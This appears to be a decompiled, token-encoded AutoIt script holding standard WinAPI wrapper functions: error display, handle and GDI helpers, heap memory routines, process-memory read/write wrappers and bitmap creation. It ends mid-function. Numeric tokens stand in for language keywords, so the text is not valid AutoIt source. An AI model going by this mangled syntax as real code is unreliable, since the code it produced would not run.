4$BEXIT535
33
32_WINAPI_SHOWLASTERROR($STEXT="",$BABORT=40,$ILANGUAGE=0,30$_ICURRENTERROR=@ERROR,30$_ICURRENTEXTENDED=@EXTENDED)
28$SERROR
28$ILASTERROR=_WINAPI_GETLASTERROR()
91
$SERROR=_WINAPI_GETERRORMESSAGE($ILASTERROR,$ILANGUAGE)
4@ERROR1$ILANGUAGE5
$ILANGUAGE=0
6
18
8
10
4333($STEXT,$STR_STRIPLEADING+$STR_STRIPTRAILING)5
$STEXT&=@CRLF&@CRLF
6
$STEXT=""
8
_WINAPI_MSGBOX(19(262144,21(16,-2*(3$ILASTERROR))),$ILASTERROR,$STEXT&$SERROR)
4$ILASTERROR5
_WINAPI_SETLASTERROR($ILASTERROR)
4$BABORT5
35$ILASTERROR
8
8
34287($_ICURRENTERROR,$_ICURRENTEXTENDED,1)
33
32_WINAPI_SHOWMSG($STEXT)
_WINAPI_MSGBOX($MB_SYSTEMMODAL,"Information",$STEXT)
33
32__COMERRORFORMATING(36$OCOMERROR,$SPREFIX=@TAB)
2830$STR_STRIPTRAILING=2
28$SERROR="COM Error encountered in "&@SCRIPTNAME&" ("&$OCOMERROR.Scriptline&") :"&@CRLF&$SPREFIX&"Number        "&@TAB&"= 0x"&199($OCOMERROR.Number,8)&" ("&$OCOMERROR.Number&")"&@CRLF&$SPREFIX&"WinDescription"&@TAB&"= "&333($OCOMERROR.WinDescription,$STR_STRIPTRAILING)&@CRLF&$SPREFIX&"Description   "&@TAB&"= "&333($OCOMERROR.Description,$STR_STRIPTRAILING)&@CRLF&$SPREFIX&"Source        "&@TAB&"= "&$OCOMERROR.Source&@CRLF&$SPREFIX&"HelpFile      "&@TAB&"= "&$OCOMERROR.HelpFile&@CRLF&$SPREFIX&"HelpContext   "&@TAB&"= "&$OCOMERROR.HelpContext&@CRLF&$SPREFIX&"LastDllError  "&@TAB&"= "&$OCOMERROR.LastDllError&@CRLF&$SPREFIX&"Retcode       "&@TAB&"= 0x"&199($OCOMERROR.retcode)
34$SERROR
33
2930$DUPLICATE_CLOSE_SOURCE=1
2930$DUPLICATE_SAME_ACCESS=2
2930$OBJ_BITMAP=7
2930$OBJ_BRUSH=2
2930$OBJ_COLORSPACE=14
2930$OBJ_DC=3
2930$OBJ_ENHMETADC=12
2930$OBJ_ENHMETAFILE=13
2930$OBJ_EXTPEN=11
2930$OBJ_FONT=6
2930$OBJ_MEMDC=10
2930$OBJ_METADC=4
2930$OBJ_METAFILE=9
2930$OBJ_PAL=5
2930$OBJ_PEN=1
2930$OBJ_REGION=8
2930$NULL_BRUSH=5
2930$NULL_PEN=8
2930$BLACK_BRUSH=4
2930$DKGRAY_BRUSH=3
2930$DC_BRUSH=18
2930$GRAY_BRUSH=2
2930$HOLLOW_BRUSH=$NULL_BRUSH
2930$LTGRAY_BRUSH=1
2930$WHITE_BRUSH=0
2930$BLACK_PEN=7
2930$DC_PEN=19
2930$WHITE_PEN=6
2930$ANSI_FIXED_FONT=11
2930$ANSI_VAR_FONT=12
2930$DEVICE_DEFAULT_FONT=14
2930$DEFAULT_GUI_FONT=17
2930$OEM_FIXED_FONT=10
2930$SYSTEM_FONT=13
2930$SYSTEM_FIXED_FONT=16
2930$DEFAULT_PALETTE=15
32_WINAPI_CLOSEHANDLE($HOBJECT)
28$ARESULT=58("kernel32.dll","bool","CloseHandle","handle",$HOBJECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_DELETEOBJECT($HOBJECT)
28$ARESULT=58("gdi32.dll","bool","DeleteObject","handle",$HOBJECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_DUPLICATEHANDLE($HSOURCEPROCESSHANDLE,$HSOURCEHANDLE,$HTARGETPROCESSHANDLE,$IDESIREDACCESS,$IINHERITHANDLE,$IOPTIONS)
28$ARESULT=58("kernel32.dll","bool","DuplicateHandle","handle",$HSOURCEPROCESSHANDLE,"handle",$HSOURCEHANDLE,"handle",$HTARGETPROCESSHANDLE,"handle*",0,"dword",$IDESIREDACCESS,"bool",$IINHERITHANDLE,"dword",$IOPTIONS)
4@ERROR23$ARESULT[0]534287(@ERROR,@EXTENDED,0)
34$ARESULT[4]
33
32_WINAPI_GETCURRENTOBJECT($HDC,$ITYPE)
28$ARET=58("gdi32.dll","handle","GetCurrentObject","handle",$HDC,"uint",$ITYPE)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETCURRENTPROCESS()
28$ARESULT=58("kernel32.dll","handle","GetCurrentProcess")
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETOBJECT($HOBJECT,$ISIZE,$POBJECT)
28$ARESULT=58("gdi32.dll","int","GetObjectW","handle",$HOBJECT,"int",$ISIZE,"struct*",$POBJECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETOBJECTINFOBYHANDLE($HOBJECT)
28$TAGPUBLIC_OBJECT_BASIC_INFORMATION="ulong Attributes;ulong GrantedAcess;ulong HandleCount;ulong PointerCount;ulong Reserved[10]"
28$TPOBI=65($TAGPUBLIC_OBJECT_BASIC_INFORMATION)
28$ARET=58("ntdll.dll","long","ZwQueryObject","handle",$HOBJECT,"uint",0,"struct*",$TPOBI,"ulong",68($TPOBI),"ptr",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
28$ARESULT[4]
13$I=0153
$ARESULT[$I]=66($TPOBI,$I+1)
14
34$ARESULT
33
32_WINAPI_GETOBJECTNAMEBYHANDLE($HOBJECT)
28$TAGUNICODE_STRING="struct;ushort Length;ushort MaximumLength;ptr Buffer;endstruct"
28$TAGPUBLIC_OBJECT_TYPE_INFORMATION="struct;"&$TAGUNICODE_STRING&";ulong Reserved[22];endstruct"
28$TPOTI=65($TAGPUBLIC_OBJECT_TYPE_INFORMATION&";byte[32]")
28$ARET=58("ntdll.dll","long","ZwQueryObject","handle",$HOBJECT,"uint",2,"struct*",$TPOTI,"ulong",68($TPOTI),"ulong*",0)
4@ERROR534287(@ERROR,@EXTENDED,"")
4$ARET[0]534287(10,$ARET[0],"")
28$PDATA=66($TPOTI,3)
43$PDATA534287(11,0,"")
34_WINAPI_GETSTRING($PDATA)
33
32_WINAPI_GETOBJECTTYPE($HOBJECT)
28$ARET=58("gdi32.dll","dword","GetObjectType","handle",$HOBJECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETSTDHANDLE($ISTDHANDLE)
4$ISTDHANDLE<02$ISTDHANDLE>2534287(2,0,-1)
2830$AHANDLE[3]=[-10,-11,-12]
28$ARESULT=58("kernel32.dll","handle","GetStdHandle","dword",$AHANDLE[$ISTDHANDLE])
4@ERROR534287(@ERROR,@EXTENDED,-1)
34$ARESULT[0]
33
32_WINAPI_GETSTOCKOBJECT($IOBJECT)
28$ARESULT=58("gdi32.dll","handle","GetStockObject","int",$IOBJECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_SELECTOBJECT($HDC,$HGDIOBJ)
28$ARESULT=58("gdi32.dll","handle","SelectObject","handle",$HDC,"handle",$HGDIOBJ)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_SETHANDLEINFORMATION($HOBJECT,$IMASK,$IFLAGS)
28$ARESULT=58("kernel32.dll","bool","SetHandleInformation","handle",$HOBJECT,"dword",$IMASK,"dword",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
29$__G_HHEAP=0
32_WINAPI_CREATEBUFFER($ILENGTH,$PBUFFER=0,$BABORT=39)
$PBUFFER=__HEAPREALLOC($PBUFFER,$ILENGTH,0,$BABORT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$PBUFFER
33
32_WINAPI_CREATEBUFFERFROMSTRUCT($TSTRUCT,$PBUFFER=0,$BABORT=39)
43223($TSTRUCT)534287(1,0,0)
$PBUFFER=__HEAPREALLOC($PBUFFER,68($TSTRUCT),0,$BABORT)
4@ERROR534287(@ERROR+100,@EXTENDED,0)
_WINAPI_MOVEMEMORY($PBUFFER,$TSTRUCT,68($TSTRUCT))
34$PBUFFER
33
32_WINAPI_CREATESTRING($SSTRING,$PSTRING=0,$ILENGTH=-1,$BUNICODE=39,$BABORT=39)
$ILENGTH=250($ILENGTH)
4$ILENGTH>=05
$SSTRING=322($SSTRING,$ILENGTH)
6
$ILENGTH=323($SSTRING)
8
28$ISIZE=$ILENGTH+1
4$BUNICODE5
$ISIZE*=2
8
$PSTRING=__HEAPREALLOC($PSTRING,$ISIZE,0,$BABORT)
4@ERROR534287(@ERROR,@EXTENDED,0)
69(65(($BUNICODE"wchar""char")&"["&($ILENGTH+1)&"]",$PSTRING),1,$SSTRING)
34288($ILENGTH,$PSTRING)
33
32_WINAPI_EQUALMEMORY($PSOURCE1,$PSOURCE2,$ILENGTH)
4_WINAPI_ISBADREADPTR($PSOURCE1,$ILENGTH)534287(11,@EXTENDED,0)
4_WINAPI_ISBADREADPTR($PSOURCE2,$ILENGTH)534287(12,@EXTENDED,0)
28$ARET=58("ntdll.dll","ulong_ptr","RtlCompareMemory","struct*",$PSOURCE1,"struct*",$PSOURCE2,"ulong_ptr",$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,0)
34250($ARET[0]=$ILENGTH)
33
32_WINAPI_FILLMEMORY($PMEMORY,$ILENGTH,$IVALUE=0)
4_WINAPI_ISBADWRITEPTR($PMEMORY,$ILENGTH)534287(11,@EXTENDED,0)
58("ntdll.dll","none","RtlFillMemory","struct*",$PMEMORY,"ulong_ptr",$ILENGTH,"byte",$IVALUE)
4@ERROR534287(@ERROR,@EXTENDED,0)
341
33
32_WINAPI_FREEMEMORY($PMEMORY)
43__HEAPFREE($PMEMORY,1)534287(@ERROR,@EXTENDED,0)
341
33
32_WINAPI_GETMEMORYSIZE($PMEMORY)
28$IRESULT=__HEAPSIZE($PMEMORY,1)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$IRESULT
33
32_WINAPI_GLOBALMEMORYSTATUS()
2830$TAGMEMORYSTATUSEX="dword Length;dword MemoryLoad;"&"uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;"&"uint64 TotalVirtual;uint64 AvailVirtual;uint64 AvailExtendedVirtual"
28$TMEM=65($TAGMEMORYSTATUSEX)
69($TMEM,1,68($TMEM))
28$ARET=58("kernel32.dll","bool","GlobalMemoryStatusEx","struct*",$TMEM)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$AMEM[7]
$AMEM[0]=66($TMEM,2)
$AMEM[1]=66($TMEM,3)
$AMEM[2]=66($TMEM,4)
$AMEM[3]=66($TMEM,5)
$AMEM[4]=66($TMEM,6)
$AMEM[5]=66($TMEM,7)
$AMEM[6]=66($TMEM,8)
34$AMEM
33
32_WINAPI_ISBADCODEPTR($PADDRESS)
28$ARET=58("kernel32.dll","bool","IsBadCodePtr","struct*",$PADDRESS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ISBADREADPTR($PADDRESS,$ILENGTH)
28$ARET=58("kernel32.dll","bool","IsBadReadPtr","struct*",$PADDRESS,"uint_ptr",$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ISBADSTRINGPTR($PADDRESS,$ILENGTH)
28$ARET=58("kernel32.dll","bool","IsBadStringPtr","struct*",$PADDRESS,"uint_ptr",$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ISBADWRITEPTR($PADDRESS,$ILENGTH)
28$ARET=58("kernel32.dll","bool","IsBadWritePtr","struct*",$PADDRESS,"uint_ptr",$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ISMEMORY($PMEMORY)
28$BRESULT=__HEAPVALIDATE($PMEMORY)
34287(@ERROR,@EXTENDED,$BRESULT)
33
32_WINAPI_LOCALFREE($HMEMORY)
28$ARESULT=58("kernel32.dll","handle","LocalFree","handle",$HMEMORY)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_MOVEMEMORY($PDESTINATION,$PSOURCE,$ILENGTH)
4_WINAPI_ISBADREADPTR($PSOURCE,$ILENGTH)534287(10,@EXTENDED,0)
4_WINAPI_ISBADWRITEPTR($PDESTINATION,$ILENGTH)534287(11,@EXTENDED,0)
58("ntdll.dll","none","RtlMoveMemory","struct*",$PDESTINATION,"struct*",$PSOURCE,"ulong_ptr",$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,0)
341
33
32_WINAPI_READPROCESSMEMORY($HPROCESS,$PBASEADDRESS,$PBUFFER,$ISIZE,36$IREAD)
28$ARESULT=58("kernel32.dll","bool","ReadProcessMemory","handle",$HPROCESS,"ptr",$PBASEADDRESS,"struct*",$PBUFFER,"ulong_ptr",$ISIZE,"ulong_ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
$IREAD=$ARESULT[5]
34$ARESULT[0]
33
32_WINAPI_WRITEPROCESSMEMORY($HPROCESS,$PBASEADDRESS,$PBUFFER,$ISIZE,36$IWRITTEN,$SBUFFER="ptr")
28$ARESULT=58("kernel32.dll","bool","WriteProcessMemory","handle",$HPROCESS,"ptr",$PBASEADDRESS,$SBUFFER,$PBUFFER,"ulong_ptr",$ISIZE,"ulong_ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
$IWRITTEN=$ARESULT[5]
34$ARESULT[0]
33
32_WINAPI_ZEROMEMORY($PMEMORY,$ILENGTH)
4_WINAPI_ISBADWRITEPTR($PMEMORY,$ILENGTH)534287(11,@EXTENDED,0)
58("ntdll.dll","none","RtlZeroMemory","struct*",$PMEMORY,"ulong_ptr",$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,0)
341
33
32__HEAPALLOC($ISIZE,$BABORT=40)
28$ARET
43$__G_HHEAP5
$ARET=58("kernel32.dll","handle","HeapCreate","dword",0,"ulong_ptr",0,"ulong_ptr",0)
4@ERROR23$ARET[0]5__FATALEXIT(1,"Error allocating memory.")
$__G_HHEAP=$ARET[0]
8
$ARET=58("kernel32.dll","ptr","HeapAlloc","handle",$__G_HHEAP,"dword",8,"ulong_ptr",$ISIZE)
4@ERROR23$ARET[0]5
4$BABORT5__FATALEXIT(1,"Error allocating memory.")
34287(@ERROR+30,@EXTENDED,0)
8
34$ARET[0]
33
32__HEAPFREE(36$PMEMORY,$BCHECK=40,$ICURERR=@ERROR,$ICUREXT=@EXTENDED)
4$BCHECK1(3__HEAPVALIDATE($PMEMORY))534287(@ERROR,@EXTENDED,0)
28$ARET=58("kernel32.dll","int","HeapFree","handle",$__G_HHEAP,"dword",0,"ptr",$PMEMORY)
4@ERROR23$ARET[0]534287(@ERROR+40,@EXTENDED,0)
$PMEMORY=0
34287($ICURERR,$ICUREXT,1)
33
32__HEAPREALLOC($PMEMORY,$ISIZE,$BAMOUNT=40,$BABORT=40)
28$ARET,$PRET
4__HEAPVALIDATE($PMEMORY)5
4$BAMOUNT1(__HEAPSIZE($PMEMORY)>=$ISIZE)534288(1,273($PMEMORY))
$ARET=58("kernel32.dll","ptr","HeapReAlloc","handle",$__G_HHEAP,"dword",8,"ptr",$PMEMORY,"ulong_ptr",$ISIZE)
4@ERROR23$ARET[0]5
4$BABORT5__FATALEXIT(1,"Error allocating memory.")
34287(@ERROR+20,@EXTENDED,273($PMEMORY))
8
$PRET=$ARET[0]
6
$PRET=__HEAPALLOC($ISIZE,$BABORT)
4@ERROR534287(@ERROR,@EXTENDED,0)
8
34$PRET
33
32__HEAPSIZE($PMEMORY,$BCHECK=40)
4$BCHECK1(3__HEAPVALIDATE($PMEMORY))534287(@ERROR,@EXTENDED,0)
28$ARET=58("kernel32.dll","ulong_ptr","HeapSize","handle",$__G_HHEAP,"dword",0,"ptr",$PMEMORY)
4@ERROR2($ARET[0]=273(-1))534287(@ERROR+50,@EXTENDED,0)
34$ARET[0]
33
32__HEAPVALIDATE($PMEMORY)
4(3$__G_HHEAP)2(3273($PMEMORY))534287(9,0,40)
28$ARET=58("kernel32.dll","int","HeapValidate","handle",$__G_HHEAP,"dword",0,"ptr",$PMEMORY)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
2930$SND_APPLICATION=128
2930$SND_ALIAS=65536
2930$SND_ALIAS_ID=1114112
2930$SND_ASYNC=1
2930$SND_FILENAME=131072
2930$SND_LOOP=8
2930$SND_MEMORY=4
2930$SND_NODEFAULT=2
2930$SND_NOSTOP=16
2930$SND_NOWAIT=8192
2930$SND_PURGE=64
2930$SND_RESOURCE=262148
2930$SND_SENTRY=524288
2930$SND_SYNC=0
2930$SND_SYSTEM=2097152
2930$SND_SYSTEM_NOSTOP=2097168
2930$SND_ALIAS_SYSTEMASTERISK="SystemAsterisk"
2930$SND_ALIAS_SYSTEMDEFAULT="SystemDefault"
2930$SND_ALIAS_SYSTEMEXCLAMATION="SystemExclamation"
2930$SND_ALIAS_SYSTEMEXIT="SystemExit"
2930$SND_ALIAS_SYSTEMHAND="SystemHand"
2930$SND_ALIAS_SYSTEMQUESTION="SystemQuestion"
2930$SND_ALIAS_SYSTEMSTART="SystemStart"
2930$SND_ALIAS_SYSTEMWELCOME="SystemWelcome"
32_WINAPI_ARRAYTOSTRUCT(3036$ADATA,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($ADATA,$ISTART,$IEND)534287(@ERROR+10,@EXTENDED,0)
28$TAGSTRUCT=""
13$I=$ISTART15$IEND
$TAGSTRUCT&="wchar["&(323($ADATA[$I])+1)&"];"
14
28$TDATA=65($TAGSTRUCT&"wchar[1]")
28$ICOUNT=1
13$I=$ISTART15$IEND
69($TDATA,$ICOUNT,$ADATA[$I])
$ICOUNT+=1
14
69($TDATA,$ICOUNT,29(0))
34$TDATA
33
32_WINAPI_CREATEMARGINS($ILEFTWIDTH,$IRIGHTWIDTH,$ITOPHEIGHT,$IBOTTOMHEIGHT)
28$TMARGINS=65($TAGMARGINS)
69($TMARGINS,1,$ILEFTWIDTH)
69($TMARGINS,2,$IRIGHTWIDTH)
69($TMARGINS,3,$ITOPHEIGHT)
69($TMARGINS,4,$IBOTTOMHEIGHT)
34$TMARGINS
33
32_WINAPI_CREATEPOINT($IX,$IY)
28$TPOINT=65($TAGPOINT)
69($TPOINT,1,$IX)
69($TPOINT,2,$IY)
34$TPOINT
33
32_WINAPI_CREATERECT($ILEFT,$ITOP,$IRIGHT,$IBOTTOM)
28$TRECT=65($TAGRECT)
69($TRECT,1,$ILEFT)
69($TRECT,2,$ITOP)
69($TRECT,3,$IRIGHT)
69($TRECT,4,$IBOTTOM)
34$TRECT
33
32_WINAPI_CREATERECTEX($IX,$IY,$IWIDTH,$IHEIGHT)
28$TRECT=65($TAGRECT)
69($TRECT,1,$IX)
69($TRECT,2,$IY)
69($TRECT,3,$IX+$IWIDTH)
69($TRECT,4,$IY+$IHEIGHT)
34$TRECT
33
32_WINAPI_CREATESIZE($IWIDTH,$IHEIGHT)
28$TSIZE=65($TAGSIZE)
69($TSIZE,1,$IWIDTH)
69($TSIZE,2,$IHEIGHT)
34$TSIZE
33
32_WINAPI_COPYSTRUCT($TSTRUCT,$SSTRUCT="")
28$ISIZE=68($TSTRUCT)
43$ISIZE534287(1,0,0)
28$TRESULT
43333($SSTRUCT,$STR_STRIPLEADING+$STR_STRIPTRAILING+$STR_STRIPSPACES)5
$TRESULT=65("byte["&$ISIZE&"]")
6
$TRESULT=65($SSTRUCT)
8
468($TRESULT)<$ISIZE534287(2,0,0)
_WINAPI_MOVEMEMORY($TRESULT,$TSTRUCT,$ISIZE)
34$TRESULT
33
32_WINAPI_GETEXTENDED()
34$__G_VEXT
33
32_WINAPI_GETMOUSEPOS($BTOCLIENT=40,$HWND=0)
28$IMODE=258("MouseCoordMode",1)
28$APOS=245()
258("MouseCoordMode",$IMODE)
28$TPOINT=65($TAGPOINT)
69($TPOINT,"X",$APOS[0])
69($TPOINT,"Y",$APOS[1])
4$BTOCLIENT13_WINAPI_SCREENTOCLIENT($HWND,$TPOINT)534287(@ERROR+20,@EXTENDED,0)
34$TPOINT
33
32_WINAPI_GETMOUSEPOSX($BTOCLIENT=40,$HWND=0)
28$TPOINT=_WINAPI_GETMOUSEPOS($BTOCLIENT,$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
3466($TPOINT,"X")
33
32_WINAPI_GETMOUSEPOSY($BTOCLIENT=40,$HWND=0)
28$TPOINT=_WINAPI_GETMOUSEPOS($BTOCLIENT,$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
3466($TPOINT,"Y")
33
32_WINAPI_MULDIV($INUMBER,$INUMERATOR,$IDENOMINATOR)
28$ARESULT=58("kernel32.dll","int","MulDiv","int",$INUMBER,"int",$INUMERATOR,"int",$IDENOMINATOR)
4@ERROR534287(@ERROR,@EXTENDED,-1)
34$ARESULT[0]
33
32_WINAPI_PLAYSOUND($SSOUND,$IFLAGS=$SND_SYSTEM_NOSTOP,$HINSTANCE=0)
28$STYPEOFSOUND="ptr"
4$SSOUND5
4233($SSOUND)5
$STYPEOFSOUND="wstr"
8
6
$SSOUND=0
$IFLAGS=0
8
28$ARET=58("winmm.dll","bool","PlaySoundW",$STYPEOFSOUND,$SSOUND,"handle",$HINSTANCE,"dword",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_STRINGLENA(3036$TSTRING)
28$ARESULT=58("kernel32.dll","int","lstrlenA","struct*",$TSTRING)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_STRINGLENW(3036$TSTRING)
28$ARESULT=58("kernel32.dll","int","lstrlenW","struct*",$TSTRING)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_STRUCTTOARRAY(36$TSTRUCT,$IITEMS=0)
28$ISIZE=2*125(68($TSTRUCT)/2)
28$PSTRUCT=67($TSTRUCT)
43$ISIZE23$PSTRUCT534287(1,0,0)
28$TDATA,$ILENGTH,$IOFFSET=0
28$ARESULT[101]=[0]
91
$ILENGTH=_WINAPI_STRLEN($PSTRUCT+$IOFFSET)
43$ILENGTH5
18
8
42*(1+$ILENGTH)+$IOFFSET>$ISIZE534287(3,0,0)
$TDATA=65("wchar["&(1+$ILENGTH)&"]",$PSTRUCT+$IOFFSET)
4@ERROR534287(@ERROR+10,0,0)
__INC($ARESULT)
$ARESULT[$ARESULT[0]]=66($TDATA,1)
4$ARESULT[0]=$IITEMS5
18
8
$IOFFSET+=2*(1+$ILENGTH)
4$IOFFSET>=$ISIZE534287(3,0,0)
10
43$ARESULT[0]534287(2,0,0)
__INC($ARESULT,-1)
34$ARESULT
33
32_WINAPI_UNIONSTRUCT($TSTRUCT1,$TSTRUCT2,$SSTRUCT="")
28$ASIZE[2]=[68($TSTRUCT1),68($TSTRUCT2)]
43$ASIZE[0]23$ASIZE[1]534287(1,0,0)
28$TRESULT
43333($SSTRUCT,$STR_STRIPLEADING+$STR_STRIPTRAILING+$STR_STRIPSPACES)5
$TRESULT=65("byte["&($ASIZE[0]+$ASIZE[1])&"]")
6
$TRESULT=65($SSTRUCT)
8
468($TRESULT)<($ASIZE[0]+$ASIZE[1])534287(2,0,0)
_WINAPI_MOVEMEMORY($TRESULT,$TSTRUCT1,$ASIZE[0])
_WINAPI_MOVEMEMORY(67($TRESULT)+$ASIZE[0],$TSTRUCT2,$ASIZE[1])
34$TRESULT
33
2930$TAGBITMAP="struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
2930$TAGBITMAPV5HEADER="struct;dword bV5Size;long bV5Width;long bV5Height;ushort bV5Planes;ushort bV5BitCount;dword bV5Compression;dword bV5SizeImage;long bV5XPelsPerMeter;long bV5YPelsPerMeter;dword bV5ClrUsed;dword bV5ClrImportant;dword bV5RedMask;dword bV5GreenMask;dword bV5BlueMask;dword bV5AlphaMask;dword bV5CSType;int bV5Endpoints[9];dword bV5GammaRed;dword bV5GammaGreen;dword bV5GammaBlue;dword bV5Intent;dword bV5ProfileData;dword bV5ProfileSize;dword bV5Reserved;endstruct"
2930$TAGDIBSECTION=$TAGBITMAP&";"&$TAGBITMAPINFOHEADER&";dword dsBitfields[3];ptr dshSection;dword dsOffset"
2930$TMPF_FIXED_PITCH=1
2930$TMPF_VECTOR=2
2930$TMPF_TRUETYPE=4
2930$TMPF_DEVICE=8
2930$__WINAPICONSTANT_FW_NORMAL=400
2930$__WINAPICONSTANT_DEFAULT_CHARSET=1
2930$__WINAPICONSTANT_OUT_DEFAULT_PRECIS=0
2930$__WINAPICONSTANT_CLIP_DEFAULT_PRECIS=0
2930$__WINAPICONSTANT_DEFAULT_QUALITY=0
32_WINAPI_BITBLT($HDESTDC,$IXDEST,$IYDEST,$IWIDTH,$IHEIGHT,$HSRCDC,$IXSRC,$IYSRC,$IROP)
28$ARESULT=58("gdi32.dll","bool","BitBlt","handle",$HDESTDC,"int",$IXDEST,"int",$IYDEST,"int",$IWIDTH,"int",$IHEIGHT,"handle",$HSRCDC,"int",$IXSRC,"int",$IYSRC,"dword",$IROP)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_COMBINERGN($HRGNDEST,$HRGNSRC1,$HRGNSRC2,$ICOMBINEMODE)
28$ARESULT=58("gdi32.dll","int","CombineRgn","handle",$HRGNDEST,"handle",$HRGNSRC1,"handle",$HRGNSRC2,"int",$ICOMBINEMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_COPYBITMAP($HBITMAP)
$HBITMAP=_WINAPI_COPYIMAGE($HBITMAP,0,0,0,8192)
34287(@ERROR,@EXTENDED,$HBITMAP)
33
32_WINAPI_COPYIMAGE($HIMAGE,$ITYPE=0,$IXDESIREDPIXELS=0,$IYDESIREDPIXELS=0,$IFLAGS=0)
28$ARET=58("user32.dll","handle","CopyImage","handle",$HIMAGE,"uint",$ITYPE,"int",$IXDESIREDPIXELS,"int",$IYDESIREDPIXELS,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATEANDBITMAP($HBITMAP)
28$IERROR=0,$HDIB=0
$HBITMAP=_WINAPI_COPYBITMAP($HBITMAP)
43$HBITMAP534287(@ERROR+20,@EXTENDED,0)
11
28$ATDIB[2]
$ATDIB[0]=65($TAGDIBSECTION)
4(3_WINAPI_GETOBJECT($HBITMAP,68($ATDIB[0]),$ATDIB[0]))2(66($ATDIB[0],"bmBitsPixel")<>32)2(66($ATDIB[0],"biCompression"))5
$IERROR=10
18
8
$ATDIB[1]=65($TAGBITMAP)
$HDIB=_WINAPI_CREATEDIB(66($ATDIB[0],"bmWidth"),66($ATDIB[0],"bmHeight"),1)
43_WINAPI_GETOBJECT($HDIB,68($ATDIB[1]),$ATDIB[1])5
$IERROR=11
18
8
28$ARET=58("user32.dll","lresult","CallWindowProc","ptr",__ANDPROC(),"ptr",0,"uint",0,"wparam",67($ATDIB[0]),"lparam",67($ATDIB[1]))
4@ERROR5
$IERROR=@ERROR
18
8
43$ARET[0]5
$IERROR=12
18
8
$IERROR=0
121
_WINAPI_DELETEOBJECT($HBITMAP)
4$IERROR5
4$HDIB5
_WINAPI_DELETEOBJECT($HDIB)
8
$HDIB=0
8
34287($IERROR,0,$HDIB)
33
32_WINAPI_CREATEBITMAP($IWIDTH,$IHEIGHT,$IPLANES=1,$IBITSPERPEL=1,$PBITS=0)
28$ARESULT=58("gdi32.dll","handle","CreateBitmap","int",$IWIDTH,"int",$IHEIGHT,"uint",$IPLANES,"uint",$IBITSPERPEL,"struct*",$PBITS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATECOMPATIBLEBITMAP($HDC,$IWIDTH,$IHEIGHT)
28$ARESULT=58("gdi32.dll","handle","CreateCompatibleBitmap","handle",$HDC,"int",$IWIDTH,"int",$IHEIGHT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATEDIB($IWIDTH,$IHEIGHT,$IBITSPERPEL=32,$TCOLORTABLE=0,$ICOLORCOUNT=0)
28$ARGBQ[2],$ICOLORS,$TAGRGBQ
23$IBITSPERPEL
211
$ICOLORS=2
214
$ICOLORS=16
218
$ICOLORS=256
216
$ICOLORS=0
24
4$ICOLORS5
43223($TCOLORTABLE)5
23$IBITSPERPEL
211
$ARGBQ[0]=0
$ARGBQ[1]=16777215
$TCOLORTABLE=_WINAPI_CREATEDIBCOLORTABLE($ARGBQ)
216
24
6
4$ICOLORS>$ICOLORCOUNT5
$ICOLORS=$ICOLORCOUNT
8
4(3$ICOLORS)2((4*$ICOLORS)>68($TCOLORTABLE))5
34287(20,0,0)
8
8
$TAGRGBQ=";dword aRGBQuad["&$ICOLORS&"]"
6
$TAGRGBQ=""
8
28$TBITMAPINFO=65($TAGBITMAPINFOHEADER&$TAGRGBQ)
69($TBITMAPINFO,"biSize",40)
69($TBITMAPINFO,"biWidth",$IWIDTH)
69($TBITMAPINFO,"biHeight",$IHEIGHT)
69($TBITMAPINFO,"biPlanes",1)
69($TBITMAPINFO,"biBitCount",$IBITSPERPEL)
69($TBITMAPINFO,"biCompression",0)
